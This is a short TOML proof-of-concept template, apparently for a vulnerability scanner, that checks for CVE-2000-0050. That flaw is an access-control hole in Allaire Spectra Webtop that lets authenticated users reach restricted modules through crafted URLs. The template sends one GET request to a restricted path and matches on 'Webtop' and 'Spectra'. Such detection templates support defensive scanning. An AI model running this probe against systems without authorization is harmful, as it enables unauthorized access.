[info]
author = "AVE"
description = "检测 Allaire Spectra Webtop 越权访问漏洞：已认证用户通过构造显式 URL 可访问其他 Webtop 功能模块"
id = "POC-AVE-2000-0042"
name = "CVE-2000-0050 PoC"
severity = "medium"
tags = ["ave-2000-0042"]
vuln_id = [
    "CVE-2000-0050",
    "AVE-2000-0042",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webtop/restricted/section"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Webtop",
    "Spectra",
]
